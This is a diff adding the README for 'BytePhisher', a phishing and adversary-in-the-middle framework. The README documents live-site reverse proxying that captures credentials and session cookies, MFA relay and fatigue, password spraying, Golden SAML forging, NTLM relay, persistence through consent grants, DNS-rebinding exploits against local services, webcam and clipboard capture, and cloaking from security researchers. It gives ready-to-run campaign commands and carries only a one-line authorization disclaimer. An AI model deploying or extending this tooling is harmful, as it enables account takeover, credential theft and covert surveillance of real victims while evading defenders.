@@ -1,0 +1,573 @@
+# BytePhisher 0.1.0
+
+**Advanced phishing / AiTM red-team framework** - static pages and a real
+reverse-proxy engine, pure Python.
+
+Pure-Python engine (no PHP), 670 brand templates, 5 concurrent tunnels,
+SQLite capture store, live TUI + web dashboard, 2FA/OTP flow, campaign tagging
+with A/B template rotation, bot/scanner risk scoring, SMTP
+lure-delivery module, CSV/JSON export, a **deep device dump on page open**
+(190+ browser capabilities, fonts, GPU, WebRTC, permissions, automation
+evidence) — and a
+**reverse-proxy engine** that mirrors a real live site with a capture hook
+injected, so the victim's session is genuine (Evilginx-class, pure Python).
+
+> Use only where you hold written authorization (client scope, CTF rules, your own lab).
+
+---
+
+## Two engines in one tool
+
+| mode | how it works | when to use it |
+|---|---|---|
+| **static** (`-o google`) | serves a generated brand page from `templates/` | quick lab work, anything where a copied page is enough |
+| **reverse proxy** (`--proxy --upstream site.com`) | serves the **real site** through your link with a capture hook injected; the login really completes upstream | red-team engagements where a static copy would be spotted instantly |
+
+Proxy mode is documented end-to-end in [`docs/PROXY.md`](docs/PROXY.md) —
+including the list of what breaks (WebSockets, HTTP/2-only endpoints,
+strict CSP-reporting sites) and why MFA is relayed rather than bypassed.
+
+## How a visit flows
+
+```mermaid
+flowchart LR
+    V[Victim] --> T[Tunnel]
+    T --> G{gate + blocklist}
+    G -- refused --> D[decoy]
+    G -- allowed --> P[login page + collector]
+    P --> V
+    V -- "device dump, live typing" --> C[collector]
+    C --> DB[(capture store)]
+    V -- "login + streamed code" --> R[proxy]
+    R -- "same session" --> U[real site]
+    U -- "session cookie" --> R
+    R --> DB
+    DB --> A[alerts]
+    A --> TG[Telegram]
+    TG -- "commands, button taps" --> DB
+```
+
+## Roadmap and status
+
+**`docs/ROADMAP.md` is the single source of truth**: where the tool stands, the
+evidence-based gap matrix, and the ordered plan (phases A-D) with the test that proves
+each item. It is edited in place, so it never has to be asked for twice.
+
+## Capabilities
+
+Each row is a capability and what it actually does; the file that implements it and
+the test that proves it are named in `docs/FEATURE_MATRIX.md`.
+
+- **The token tier, where the token lands** - a captured token set is annotated the moment it is stored: replayability from the device-bound and CAE claims (`not_replayable` / `fragile` / `replayable` / `unknown`, never "replayable" by default), the scopes it actually holds, and which root-of-trust path the identity's rights open (`core/tokenintel.py`; the verdict rides in the operator alert and in the chain result)
+- **NTLM relay over HTTP (ESC8)** - the relay holds one authentication open and forwards it: the challenge comes from the CA, the response comes from the victim, and the CA's certificate goes back to the client. NTLM over HTTP has no channel binding, so SMB signing (which stops SMB relay) is not in play at all (`core/relay.py`; `--relay-plan`, `--relay-start`, `--coerce-plan`)
+- **Token keep-alive** - rotate a captured refresh token on a schedule so it never dies from inactivity, and each rotation consumes the old one, so revoking the previous token does nothing (`core/keepalive.py`, `--token-keepalive SID`; refuses to start when `core.dbsc` says the token is device-bound)
+- **MFA fatigue** - the password is enough if you ask often enough: paced prompts with jitter and a rotating user agent, and the module states that number matching defeats it before you spend the attempts (`core/mfafatigue.py`, `--fatigue-plan`)
+- **Lockout-aware spraying** - one password across many accounts, budget = threshold - 1 per account per window, and the run stops on the first lockout (`core/spray.py`, `--spray-plan`)
+- **App-only persistence** - register an application, attach the permissions, grant consent, mint a client-credentials token: the credential has NO user behind it, so a password reset, an MFA change, a session revocation and a device-bound/CAE control all miss it (`core/appconsent.py`; permission ids are read from the tenant, never guessed, and `revoke()` is the clean-up path)
+- **Root of trust, mapped and wired** - the six rungs above a session (federation, AD CS/PKI, the sync account, the IdP signing key, endpoint root, provider infrastructure) with the honest verdict per identity: `open` / `needs_a_call` / `blocked` / `no_rights_visible` / `not_reachable_from_a_session`, each naming the next step where this tool implements it (`core/tier0.py`, `docs/ROOT_OF_TRUST.md`)
+- **Federation as the three calls it is** - add the domain, publish the DNS record, `PATCH` the `federationConfiguration` with your issuer and signing certificate: the tenant then trusts an IdP you control (`core/federation.py`; refuses without a signing certificate, and `remove_federation()` is the clean-up)
+- **Golden SAML** - build and sign the assertion (enveloped XMLDSig, RSA-SHA256, pluggable signer) with the role claim that decides the privilege; it REFUSES without the IdP's token-signing key, because an unsigned assertion is not a forged one (`core/samlforge.py`, `docs/SAML_FORGE.md`)
+- **AD CS probe** - the enrolment endpoint's reachability, an NTLM offer (the ESC8 precondition), an anonymous template read, and the ESC conditions explicitly NOT visible from an HTTP request (`core/adcs.py`)
+- **ConsentFix** - the silent authorization request (`prompt=none`) tried first, because a silent success is a code minted inside the victim's own live session - the case device binding and CAE cannot catch (`core/consentfix.py`)
+- **Scope swap (FOCI) and PRT posture** - a refresh exchange across the first-party clients that can ask for more scope, with every refusal recorded; and what a tenant would say to a phantom device before anything is attempted (`core/foci.py`, `core/prt.py`)
+- **The second act** - replies read over IMAP, threaded against the campaign's own `Message-ID`s, classified, and answered with the follow-up the pretext scripts - or the honest "do not send" for a refusal (`core/inbox.py`)
+- **The paste layer (ClickFix)** - the page, the clipboard write, the platform steps and the copy/paste beacon, never the payload; the detection notes ship with the module (`core/clickfix.py`, `docs/CLICKFIX.md`)
+- **Delivery that arrives** - QR codes (stdlib encoder, verified cell for cell against an independent implementation), `.ics` invites, sender identity end to end, pacing with jitter, a pretext library, and a target list whose forms arrive pre-filled
+- **Installable lure** - a manifest and the collector's own worker, so the icon reopens the lure with no new message (`--pwa`)
+- **Redirector chains, pool, cloaking** - `--hop` wraps the lure in open-redirect hops and `--verify-chain` follows the chain with redirects disabled; `--pool` holds the rotation state with a one-command burn; `--cloak` refuses researcher networks and never serves a detonation range
+- **Pre-serve human challenge** - a first visit gets a small brand-neutral interstitial, and only a visitor that interacts and passes the passive tells gets a signed token for the real page: a scanner that runs no JS, or runs it without interacting, never receives the clone (`--verify-first`, proxy mode; `--verify-brand` names the brand if you want one, otherwise the page stays neutral)
+- **Panic from the console** - `--panic` stops serving and keeps the data; `--kill --yes` stops and wipes every capture, session, intel row and lure. The same handlers the control channel's `/panic` and `/kill` use, so a console operator has a panic path without Telegram.
+- **Names that are not a signature** - the session cookie and the injected `data-*` attributes are derived per campaign (`--symbols random`), and the session id is never written into the page: the collector is attributed from the HttpOnly cookie
+- **Hook stealth** - the injected collector's patched `fetch`/XHR report `[native code]` and keep the native name/arity/descriptor, so an integrity script's `toString()` check does not catch them (`--hook-stealth`, default)
+- **Browser-shaped upstream** - the leg the target actually sees impersonates chrome's TLS + HTTP fingerprint by default (`--no-impersonate` to opt out)
+- **Device-code relay (RFC 8628)** - send the victim to the provider's REAL page with a code: no lookalike domain, MFA handled by them, passkeys work too (`--devicecode`, `core/devicecode.py`, `docs/DEVICECODE.md`)
+- **Server stack** - **pure Python (no PHP)**
+- **Templates** - **670 built-in + import any real login page**
+- **Reverse proxy (real site + hook)** - **✓ per-victim cookie jar, HTML rewrite, MFA relay**
+- **Deep device dump on page open** - **✓ 48 modules: client hints, fonts, GPU, WebRTC, permissions, 190+ API checks, device token**
+- **No-fetch attack paths** - **✓ form submissions into a hidden frame: not preflighted, not CORS-checked, not blocked by the local-network rules that refuse `fetch()`**
+- **Upstream TLS fingerprint** - **✓ `--impersonate chrome`**
+- **Live keystroke/field stream** - **✓ every value as typed, debounced, flushed on blur/submit**
+- **Server-side OTP completion** - **✓ a streamed code finishes the login upstream in the same session**
+- **Browser autofill escalation** - **✓ re-read every field on the first gesture**
+- **Upstream TLS fingerprint** - **✓ `--impersonate chrome`: real ClientHello, header order, per-request extension permutation**
+- **Our own response headers** - **✓ one configurable `Server`, never the Python version**
+- **Clipboard watch** - **✓ read on gesture + every paste**
+- **Media capture (permission-gated)** - **✓ webcam frame, mic clip, screen frame**
+- **Researcher/scanner filtering** - **✓ vendor + datacenter + VPN orgs, scanner UAs, scanning ranges, own file**
+- **Local-service exploitation (Docker API -> host root, Jenkins -> RCE, kubelet, Jupyter, Ollama)** - **✓ 17-service library, same-origin after rebinding so JSON POSTs work; proven against real local stubs**
+- **Router takeover plan (12 deployed panels, default creds, DNS change)** - **✓ `--router-plan`**
+- **DNS rebinding (link click -> victim's own network)** - **✓ authoritative responder, first answer public then local, readable LAN/localhost services**
+- **Reporting after the visit** - **✓ service worker + IndexedDB queue, flushed by background sync**
+- **Ordered keystroke log** - **✓ modifiers, per field, IME composition, contenteditable**
+- **Post-exploitation chains** - **✓ recon / inbox / takeover / lockout / full, per-task results + keyword hunt**
+- **Telegram control channel** - **✓ /stats /sessions /session /live /otp /takeover /lures /block + button taps**
+- **Alert action buttons** - **✓ one tap to takeover, open the live stream or block the IP**
+- **Relocatable collector path** - **✓ `--hook-path` moves every route and the injected tag**
+- **Per-session script renaming** - **✓ no byte-identical collector between victims**
+- **Tunnels** - **5 adapters, brought up concurrently (cloudflared, localhost.run, bore, pinggy, ngrok); the first three and pinggy are verified working on this build, ngrok needs an authtoken**
+- **Capture store** - **SQLite (WAL) + CSV/JSON export**
+- **Campaigns** - **✓ tagging, per-campaign stats, A/B template rotation**
+- **Campaign gating (geo/ASN/hours/cap)** - **✓ fail-closed allow-lists, logged refusals**
+- **Bot/scanner triage** - **✓ 0-100 risk score with reasons, per-row risk in exports**
+- **Real client IP behind tunnel** - **✓ CF-Connecting-IP / XFF / X-Real-IP**
+- **Geo + ISP + datacenter enrichment** - **✓ (ipapi / ipinfo, off switch)**
+- **Device / OS classification** - **✓ iOS/Android/Win/macOS/Linux**
+- **Honeypot anti-autofill field** - **✓**
+- **Form-open timing beacon (bot detection)** - **✓**
+- **OTP / 2FA page flow** - **✓ (login → creds → OTP → redirect)**
+- **Live dashboard** - **✓ rich TUI + Flask dashboard w/ SSE stream**
+- **Spear-phishing email module** - **✓ SMTP + 4 templates + variable substitution**
+- **Redirect after capture** - **✓ (or built-in thank-you page)**
+- **TLS/HTTPS serving** - **✓ (--tls --cert)**
+- **URL shadowing / social preview** - **✓ (OG meta tags baked into every template)**
+- **Cross-platform** - **Linux / macOS / Windows / Termux**
+
+## Install
+
+```bash
+# 1) as a Python package (console script `bytephisher` on your PATH)
+pip install .            # or: pip install -e .  for a live source checkout
+bytephisher --version
+
+# 2) from a source checkout (what the tests use)
+git clone <repo> bytephisher && cd bytephisher
+python3 -m venv .venv && ./.venv/bin/pip install -r requirements.txt
+./.venv/bin/python tools/gen_templates.py     # writes templates/ (670 sites)
+```
+
+Optional extras: `pip install ".[test]"` (pytest suite), `pip install ".[dev]"` (tests + ruff).
+
+`BYTEPHISHER_HOME` decides where `config/`, `templates/` and `data/` live
+(defaults to the checkout; an installed copy falls back to the current
+directory, so it never tries to write into site-packages).
+
+Requirements: Python 3.10+ (`rich`, `jinja2`, `requests`, `pyyaml`, `flask`,
+No PHP, no web server, no external binaries except the tunnel client)
+you pick (cloudflared is auto-downloaded into `bin/` when missing).
+
+## Quick start
+
+```bash
+# list the templates
+./.venv/bin/python bytephisher.py --list
+
+# local-only dry run (no tunnel), Google template on :8080
+./.venv/bin/python bytephisher.py -o google -m test
+
+# full run: Instagram over cloudflared, geo lookup on, 2FA page, then redirect
+./.venv/bin/python bytephisher.py -o instagram -t cloudflared --otp \
+    -u https://example.com/after --geo ipapi
+
+# campaign with tagging, A/B rotation, Telegram alerts and the dashboard
+./.venv/bin/python bytephisher.py -o google --rotate google,instagram \
+    --telegram "123456:AA...:987654321" --web-dashboard
+
+# every tunneler at once
+./.venv/bin/python bytephisher.py -o netflix -t all
+
+# reverse-proxy mode: mirror a real site and inject the capture hook
+./.venv/bin/python bytephisher.py --proxy --upstream sso.example.com \
+    --login-path /login -t cloudflared --campaign q3-sso
+# or with a phishlet file (recommended for real engagements)
+./.venv/bin/python bytephisher.py --proxy --phishlet config/phishlets/example.yaml
+
+# pull the data out
+./.venv/bin/python bytephisher.py --export data/captures.csv
+./.venv/bin/python bytephisher.py --export data/captures.json --campaign q3-payroll
+./.venv/bin/python bytephisher.py --reuse
+```
+
+### Flags (new in this release)
+
+| Flag | What it does |
+|---|---|
+| `--telegram-c2` | turn the Telegram bot into a control channel (commands + button taps) |
+| `--block-researchers` | refuse security vendors, cloud scanners, anonymising networks and scanner UAs outright |
+| `--blocklist-file PATH` | add your own entries: `name`, `ua:x`, `ip:x`, `net:x/y` |
+| `--hook-path PATH` | move the collector/hook routes (a fixed `/__bh` is a signature) |
+
+### Flags
+
+| Flag | Meaning |
+|---|---|
+| `-o, --option` | template index `1..670` or slug (`google`, `instagram`, …) |
+| `-t, --tunneler` | `cloudflared` \| `localhost_run` \| `bore` \| `pinggy` \| `ngrok` \| `all` \| `none` |
+| `--proxy` | reverse-proxy mode: serve the real site with the hook injected |
+| `--phishlet YAML` | target definition for `--proxy` (see `config/phishlets/example.yaml`) |
+| `--upstream HOST[:PORT]` | inline target for `--proxy` (no YAML needed) |
+| `--proxy-scheme http\|https` | scheme used to reach the upstream (default `https`) |
+| `--login-path PATH` | login path on the upstream |
+| `--impersonate PROFILE` | make the upstream leg look like a real browser (`chrome`, `firefox135`, `safari180`, …); needs `curl_cffi` |
+| `--server-header NAME` | the `Server` header on our own responses (default `nginx`, empty omits it) |
+| `--capture-cookies LIST` | cookies to harvest (`*` = all) |
+| `--inject-paths REGEXES` / `--block-paths REGEXES` | where the hook is / isn't injected |
+| `--no-verify-tls` | skip upstream certificate verification (lab only) |
+| `--no-intel` | disable the deep device dump collected on page open |
+| `--intel-perms` | also fire permission-gated probes on the first gesture |
+| `--intel-dump SID\|ID\|latest` | print the full device dump for a visitor and exit |
+| `--intel-list` | list collected devices (token, bot score, VPN score) and exit |
+| `--intel-export PATH` | write every device dump to JSON and exit |
+| `-u, --url` | redirect URL after capture |
+| `-p, --port` | local port (default 8080) |
+| `-m, --mode` | `normal` (tunnels) or `test` (local only) |
+| `--otp` | serve the 6-digit OTP page after credential submit |
+| `--tls --cert` | serve HTTPS from a PEM cert (+ key at the same path with `key` in the name) |
+| `--geo` | `ipapi` \| `ipinfo` \| `off` |
+| `--web-dashboard` / `--web-port` | Flask dashboard + JSON API |
+| `--telegram TOKEN:CHAT_ID` | send every capture to a Telegram chat |
+| `--webhook URL` | POST every capture as JSON (Discord / Slack / n8n / Mattermost) |
+| `--mailto a@x.com[,b@y.com]` | after tunnels are up, email the live link via SMTP |
+| `--mail-template` | `password_reset` \| `security_alert` \| `shared_doc` \| `invoice` |
+| `--campaign NAME` | tag captures with a campaign (default: template slug) |
+| `--rotate a,b,c` | serve a random one of these templates per request (A/B) |
+| `--allow-country CC` / `--block-country CC` | gate by country code |
+| `--block-datacenter` | refuse hosting/cloud ASNs |
+| `--active-hours 9-18` / `--active-days mon-fri` | gate by local time window |
+| `--max-hits N` | refuse an IP after N hits per hour |
+| `--decoy URL` | where gated-out visitors are sent (default: inert 503) |
+| `--tunnel-restart` | auto-restart a tunneler that dies mid-campaign (max 5 each) |
+| | `--reuse` | print credential-reuse findings (repeated identities / passwords) and exit |
+| `--export PATH` | dump captures (`.json` → JSON, anything else → CSV) and exit |
+| `--no-tui` | plain refresh output instead of the full-screen dashboard |
+
+---
+
+## Reverse-proxy mode (real site, live session)
+
+Instead of a copied page, the proxy serves the **real target** through your
+link. The hook injects into the pages you choose, the victim's login completes
+upstream, and the capture records the credential, the upstream session cookies
+and a device fingerprint.
+
+```bash
+# inline
+./.venv/bin/python bytephisher.py --proxy --upstream sso.example.com \
+    --login-path /login --capture-cookies '*' --inject-paths '^/login,^/mfa' \
+    -t cloudflared --campaign q3-sso
+
+# phishlet file (copy the example, edit it)
+cp config/phishlets/example.yaml config/phishlets/sso.yaml
+./.venv/bin/python bytephisher.py --proxy --phishlet config/phishlets/sso.yaml -t cloudflared
+```
+
+What the engine does per response: drops `Content-Security-Policy`, `HSTS` and
+`X-Frame-Options`; strips SRI `integrity`/`crossorigin`; neutralises
+`Set-Cookie` scoping; rewrites absolute upstream URLs and `Location` redirects
+back to your host; injects the hook; and keeps a **per-victim upstream cookie
+jar** so two victims never share a session. Verified live in this build against
+a real public HTTPS site: page rewritten, form POST relayed to the upstream and
+echoed back, capture stored with campaign/credential/risk flags.
+
+Full reference, including the limits (WebSockets, HTTP/2-only endpoints,
+strict CSP-reporting sites, why MFA is relayed not bypassed):
+[`docs/PROXY.md`](docs/PROXY.md).
+
+---
+
+## Deep device dump (everything the browser gives away)
+
+The moment the link opens — before anything is typed — the page reports what the
+device is willing to tell any site on the internet: client hints (CPU arch,
+bitness, browser build), screen and multi-monitor layout, timezone/locale with
+DST behaviour, canvas + audio + WebGL/WebGPU fingerprints, installed fonts,
+battery, network quality, media devices, DRM/codec support, the full permissions
+matrix, a 190+ entry API capability matrix, extension and password-manager
+artefacts, WebRTC local/public IPs (VPN inference) and live behaviour counters.
+
+```bash
+# full dump for one visitor (id, session id or 'latest')
+./.venv/bin/python bytephisher.py --intel-dump latest
+
+# who has been collected, with device tokens and bot/VPN flags
+./.venv/bin/python bytephisher.py --intel-list
+
+# machine-readable export of every device
+./.venv/bin/python bytephisher.py --intel-export data/devices.json
+```
+
+What the analysis derives from the raw modules:
+
+| conclusion | derived from |
+|---|---|
+| **device token** (stable, cookie-independent) | canvas + audio + GPU + CPU + fonts + screen + timezone |
+| **headless/bot score 0-100** + the evidence | WebDriver flag, driver globals, software GPU (SwiftShader), empty plugin arrays, impossible permission states, default virtual resolutions |
+| **VPN/proxy suspicion** + reasons | WebRTC public IP vs the HTTP source IP, relay-only ICE, timezone/language vs IP country |
+| **browser / OS / device class** | UA + client hints + feature flags (survives UA spoofing better than UA alone) |
+| **installed software hints** | font list, DRM modules, codecs, password-manager DOM markers, extension scripts |
+
+`--intel-perms` additionally fires the permission-gated probes on the first user
+gesture (geolocation, clipboard, notifications, USB/serial/HID) — those cost a
+browser prompt, so they are off by default. `--no-intel` disables the collector
+entirely. Dumps ride the same store, the same export and the same alerts as
+credential captures.
+
+---
+
+## Capture alerts (real-time)
+
+```bash
+# Telegram: every capture pings your chat
+./.venv/bin/python bytephisher.py -o google -t cloudflared --telegram "123456:AA...:987654321"
+
+# Discord/Slack/n8n webhook instead (or both at once)
+./.venv/bin/python bytephisher.py -o google --webhook https://discord.com/api/webhooks/...
+```
+
+Alerts fire on a daemon thread and are wrapped in try/except, so a dead webhook
+can never slow down or break the capture path. Same values can live in
+`config/config.yaml` (`telegram`, `webhook`).
+
+## Email open-tracking
+
+Every HTML mail built by `mailer.to_html(body, base=<public url>)` embeds a 1x1
+`/px.gif` pixel served by BytePhisher itself; loading the mail counts a visit,
+so opens are visible in the dashboard even when nobody submits the form.
+
+## Tunnel reality check
+
+`tools/probe_tunnels.py` starts a real server, brings up each tunneler, fetches
+the public URL over the internet and reports the truth. Latest run from this
+build, measured on this release:
+
+| Tunneler | Public page served | Notes |
+|---|---|---|
+| `cloudflared` | YES | auto-downloads the binary if missing; waits for edge registration so the first hit isn't a 530 |
+| `localhost_run` | YES | needs `ssh`; no account |
+| `bore` | YES | auto-downloads the musl binary from GitHub releases; `http://bore.pub:<port>` (no TLS) |
+| `ngrok` | NO (untested) | binary not installed here and free ngrok now requires an authtoken |
+| `pinggy` | YES | `ssh -p 443`, no account; publishes `tcp://host:port` and it answers plain HTTP, so the link is `http://host:port` |
+| `serveo` / `hoplink` | REMOVED | both dead services (hoplink does not resolve at all; serveo produced no URL in 20s, twice) - an adapter that cannot work is not shipped |
+
+A dead tunneler returns `None` and the rest keep working — `-t all` brings up
+everything it can and prints which links are live. During a run the CLI also
+watches the tunnel processes: if one exits (quick tunnels do drop their edge
+connection), you get a loud warning naming it rather than a silently dead link —
+and with `--tunnel-restart` the CLI brings it back automatically (up to 5
+attempts per tunneler) and prints the new public URL.
+
+## Campaign gating (who even sees the page)
+
+Scanners, researchers and VPN traffic pollute campaigns. Gate them out — every
+refusal is logged with its reason, so you can state the real ratio
+("412 visits, 37 served, 375 gated out") straight from the `blocked` table:
+
+```bash
+# only Indian visitors, never hosting/datacenter ASNs, Mon-Fri 9-18, max 5 hits/IP/h
+./.venv/bin/python bytephisher.py -o google -t cloudflared --geo ipapi \
+    --allow-country IN --block-datacenter --active-days mon-fri --active-hours 9-18 \
+    --max-hits 5 --decoy https://real-company.example/login
+```
+
+| Flag | Effect |
+|---|---|
+| `--allow-country CC[,CC]` | serve only these ISO country codes |
+| `--block-country CC[,CC]` | never serve these |
+| `--block-datacenter` | refuse hosting/cloud ASNs (kills most automated scanning) |
+| `--active-days mon-fri` / `--active-hours 9-18` | campaign only exists in that window |
+| `--max-hits N` | refuse an IP after N hits per hour (default 3600 s window) |
+| `--decoy URL` | where gated-out visitors go (default: an inert `503 Service unavailable` page) |
+
+Failure semantics are deliberate: an **allow list** fails closed (no geo data →
+refused, since nothing proves the visitor is allowed), the **datacenter filter**
+fails open (no ISP data → served, so a geo outage never takes the campaign
+dark). The CLI warns when country/datacenter gating is combined with `--geo off`.
+Gated-out visitors are not counted as visitors, so `visitors` stays meaningful.
+
+## Risk scoring (bot / scanner triage)
+
+Every submission is scored 0–100 with human-readable reasons — nothing is
+silently dropped, so campaign numbers stay defensible:
+
+| Signal | Weight |
+|---|---|
+| automation user-agent (`curl`, `python-requests`, headless, scanners) or missing UA | +40 |
+| datacenter / hosting ISP (OVH, AWS, Hetzner, DigitalOcean, …) | +35 |
+| honeypot field filled (blind autofill) | +40 |
+| submit faster than 0.8 s (1.5 s partially) | +30 / +15 |
+| unrecognised device / no geo | +10 / +5 |
+
+`low` < 30 ≤ `medium` < 70 ≤ `high`. The dashboard shows the level per row,
+CSV/JSON exports carry `risk` + `risk_reasons` on every capture, and alerts
+include the score — so a bot hit is never presented as a human credential.
+
+## Campaigns and A/B rotation
+
+```bash
+# one database, several campaigns
+./.venv/bin/python bytephisher.py -o google   --campaign q3-payroll -t cloudflared
+./.venv/bin/python bytephisher.py -o netflix  --campaign q4-invoice -t cloudflared
+
+# A/B: each visitor gets one of these templates, captures keep the campaign tag
+./.venv/bin/python bytephisher.py -o google --rotate google,instagram,netflix \
+    --campaign q4-ab-test
+
+curl -s 'localhost:8090/api/stats?campaign=q4-ab-test'
+./.venv/bin/python bytephisher.py --export data/q4.csv --campaign q4-ab-test
+```
+
+## Load testing your own instance
+
+```bash
+./.venv/bin/python tools/stress.py --port 8080 --concurrency 25 --total 1000 --mix --db data/bytephisher.db
+```
+
+Prints throughput, p50/p95/p99 latency, HTTP error counts and — with `--db` —
+the row count actually written, so a "successful" run cannot hide lost captures.
+
+## Deployment
+
+| Target | How |
+|---|---|
+| Docker | `docker compose up -d` (see `docker-compose.yml`, dashboard on :8090) |
+| systemd | `cp deploy/bytephisher.service /etc/systemd/system/ && systemctl enable --now bytephisher` — the unit hard-codes `/opt/bytephisher`; edit `WorkingDirectory`/`ExecStart` if your checkout lives elsewhere |
+| Android/Termux | `bash deploy/install-termux.sh` (set `BYTEPHISHER_REPO=<your repo url>` if you forked it; auto-downloads cloudflared arm64 on first use) |
+| Anywhere | `make install && make run` |
+
+## Documentation
+
+* `README.md` — this file: capabilities, flags, verification evidence
+* `docs/ARCHITECTURE.md` — module map, data flow, design rules
+* `docs/PROXY.md` — reverse-proxy engine: phishlet reference, limits, ops notes
+* `docs/HARVEST.md` — the live relay loop and server-side OTP completion
+* `docs/OPERATIONS.md` — Telegram control channel, post-exploitation chains, researcher/scanner filtering
+* `docs/OPERATIONS.md` — relocatable hook path and per-session script renaming
+* `docs/PROXY.md` — from a link click to the victim's own network (DNS rebinding, service-worker persistence, the keystroke log)
+* `docs/PROXY.md` — the local-service exploit library (Docker -> host root, Jenkins -> RCE, kubelet, Jupyter, Ollama, routers) and what it does not do
+* `docs/SECURITY.md` — threat model, findings and fixes
+* `docs/HARVEST.md` — deep device dump: every module, what it proves, limits
+* `docs/FEATURE_MATRIX.md` — **planned vs built**, with the gaps listed
+* `docs/USAGE.md` — operator walkthrough, campaign by campaign
+* `docs/TESTING.md` — test tiers, what is really verified, how to debug failures
+* `docs/TESTING.md` — the recorded run: per-suite counts and the suite-wide total
+* `tests/README.md` — the suites and the rules they follow
+* `CHANGELOG.md` — what changed and which bug each fix came from
+
+### Security posture
+
+The tool was reviewed adversarially (SSRF, XSS, session handling, resource
+limits, injection) and every finding is fixed and pinned by a test in
+`tests/test_security.py`. Highlights: the reverse proxy refuses to fetch
+anything but its own upstream (no open forward proxy, no cookie leak), the
+dashboard escapes every captured value before rendering, session ids are 128-bit
+and validated, the session map / recording / request body are all capped, and
+the CSV export neutralises spreadsheet formulas. Full detail, including what the
+review could not break, is in `docs/SECURITY.md`.
+
+### Before every campaign
+
+```bash
+./.venv/bin/python bytephisher.py --doctor      # deps, templates, DB, tunnelers
+./.venv/bin/python tools/probe_tunnels.py       # which tunnelers work right now
+```
+
+## Architecture
+
+```
+bytephisher.py          CLI: flags -> template/proxy -> server -> tunnels -> dashboard
+core/
+  server.py             threaded HTTP server, per-connection TLS + JA3 capture,
+                        forwarded-IP resolution, honeypot + OTP flow, rotation
+  proxy.py              reverse-proxy engine: multi-host phishlets, per-victim
+                        cookie jar, header/body rewriting, hook + js_inject,
+                        force_post, auth-token detection, decoy modes, bot gate
+  phishlet.py           phishlet v2: proxy_hosts, sub_filters, js_inject,
+                        auth_tokens/auth_urls, credentials, force_post,
+                        template params + child phishlets
+  forge.py              build a phishlet from a live login page (hosts, fields,
+                        tokens, filters, inject points) with a confidence label
+  tls_fp.py             JA3/JA3S from the raw ClientHello + per-connection
+                        TLS accept mixin (the stdlib cannot show the handshake)
+  session.py            captured-session vault + browser takeover task runner
+                        (real Chrome, replay mode for offline/lab work)
+  ops.py                live-session operations: credential validation
+                        (CONFIRMED/REJECTED/UNKNOWN) and keep-alive
+  lures.py              tracked entry points: /l/<token>, fragment, one-time burn
+  gate.py               campaign gating (country/ASN/hours/hit cap) + bot gate
+                        (JA3 + UA + browser dump -> decoy)
+  intel.py              device-dump analysis: merge waves, device token, bot
+                        score, VPN suspicion, harvest summary, CLI dump
+  capture.py            SQLite store (captures, visitors, intel, lures,
+                        sessions, scanner log), thread-safe, CSV/JSON export
+  classify.py           shared credential/device/datacenter classification
+  risk.py               0-100 bot/scanner scoring with human-readable reasons
+  alerts.py             Telegram + generic webhook notifications
+  net.py                outbound transport, IPv4-first (no IPv6 route = no crash)
+  templates.py          Jinja2 rendering, OTP/thank-you pages
+tunnels/__init__.py     6 tunneler adapters, auto-download, URL scraping from logs,
+                        process tracking + clean shutdown + watchdog helpers
+dashboard/__init__.py   rich TUI (live_loop), Flask web dashboard + SSE stream
+mailer/__init__.py      SMTP delivery (4 templates, HTML, tracking pixel)
+tools/gen_templates.py  670-site template generator (add a site = one tuple)
+tools/import_site.py    import any real login page as a template
+tools/probe_tunnels.py  probe all six tunnelers against the real internet
+tools/stress.py         load test your own instance (latency + DB integrity)
+tools/doctor.py         environment self-check
+tools/campaign.sh       one-shot campaign launcher
+core/assets/intel.js         browser-side collector (48 modules, 11 wave labels)
+deploy/                 systemd unit, Termux installer
+templates/              generated sites: index.html, otp.html, fields.json
+config/config.yaml      defaults (port, db, geo provider, smtp, alerts)
+config/phishlets/       reverse-proxy target definitions (YAML/JSON)
+tests/                  suites: units, HTTP, proxy, phishlet, bot gate, forge,
+                        session, ops, intel (+harvest), security, portability
+```
+
+### Request lifecycle
+
+1. `GET /…` → visitor counted → `index.html` rendered for the site folder.
+   (`/otp` serves the OTP page when `--otp` is on.)
+2. `POST /…` → body parsed (urlencoded **and** multipart) → every field stored
+   to SQLite with IP, city, country, ISP, UA, device class, credential flag.
+3. Response: OTP page (if `--otp` and this was a credential submit) → else
+   `302` to `-u` redirect → else the built-in thank-you page.
+4. Live dashboard reads the DB on every refresh, so hits appear immediately.
+
+## Anti-bot details
+
+- **Honeypot input** (`hp_email`, visually hidden) — naive bots/autofillers that
+  fill every field are recorded with the honeypot value set.
+- **Timing beacon** — a hidden `_ts` field records how long the form was open;
+  sub-100 ms submissions are automated, not human.
+- **Device/OS class** and **datacenter/ISP** fields let you separate real
+  targets from scanners and researchers during a campaign.
+
+## Operational notes
+
+- Client IP behind a tunnel comes from `CF-Connecting-IP` → `True-Client-IP` →
+  `X-Real-IP` → first hop of `X-Forwarded-For` → socket address, in that order.
+- SQLite runs in WAL mode with a write lock, so the threaded server never
+  corrupts the store under concurrent submissions.
+- `--geo off` disables all outbound lookups for air-gapped lab use.
+
+## Docker
+
+```bash
+docker build -t bytephisher .
+docker run --rm -p 8080:8080 -p 8090:8090 -v "$PWD/data:/app/data" bytephisher \
+    -o google -t cloudflared --web-dashboard --web-port 8090 --no-tui
+```
+
+## Tests
+
+```bash
+./.venv/bin/python tests/run_all.py          # full suite, one summary
+./.venv/bin/python tests/run_all.py --fast   # skip the live/internet suite
+```
+
+| Suite | What it proves |
+|---|---|
+| `tests/test_e2e.py` | standalone end-to-end: real HTTP server, real POST, real SQLite rows |
+| `tests/test_units.py` | body parsing (urlencoded/multipart/JSON/unicode), credential detection, device classification, capture DB (+concurrency, dedupe, migrations, CSV/JSON), all generated templates (670), mailer rendering, alerts, tunneler URL patterns, CLI helpers, custom-site import |
+| `tests/test_http.py` | live HTTP behaviour: GET/POST variants, honeypot, timing field, forwarded-IP resolution, device detection over the wire, redirect mode, OTP flow, TLS, webhook firing end-to-end, 40 parallel submissions |
+| `tests/test_features.py` | risk engine + risk over HTTP, template rotation, alert payloads, CLI flags, JSON/CSV export, stress tool integrity, doctor, campaign launcher |
+| `tests/test_gate.py` | gating parsers, gate logic (country/datacenter/hours/days/hit-cap), gating over real HTTP incl. decoy redirect and "refused visitors are not counted" |
+| `tests/test_gaps.py` | packaging/pip install, SSE dashboard stream, update check, credential reuse, migrations, tunnel watchdog |
+| `tests/test_security.py` | adversarial regression pack: SSRF via absolute-form URI, dashboard stored-XSS escaping, session-id/cookie hardening, body + session + recording caps, CSV formula injection, credential false-positives, blank-field handling, POST hit-cap, `--no-trust-headers`, TLS-without-cert guard, campaign-scoped stats |
